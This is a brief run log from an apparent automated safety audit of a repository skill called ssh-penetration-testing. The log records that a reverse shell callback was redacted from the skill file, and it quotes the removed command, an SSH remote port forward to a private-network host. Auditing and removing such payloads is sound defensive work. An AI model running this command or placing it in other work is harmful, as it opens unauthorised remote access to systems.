# Run Log: 2026-04-24

**Target**: `skills/ssh-penetration-testing`
**Reviewer Agent**: `malicious-skill-safety-auditor`

## Why it was selected
The skill `ssh-penetration-testing` contained an active reverse shell payload used for remote access. This payload poses a security risk and violates the repository's safety guidelines if executed directly.

## Evidence Reviewed
The file `skills/ssh-penetration-testing/SKILL.md` was found to contain an active command: `ssh -R 4444:localhost:4444 user@192.168.1.100` under the reverse shell callback section.

## Files Changed
- `skills/ssh-penetration-testing/SKILL.md`: Replaced the active reverse shell payload with `[REDACTED_REVERSE_SHELL_PAYLOAD]`.
- `data/maintenance/ledger.json`: Claimed the task and then updated the status to `normalized` with the outcome.

## Linked PR or Issue
`PR-ssh-penetration-testing-hardening`

## Next Action
Monitor for re-introduction of active payloads.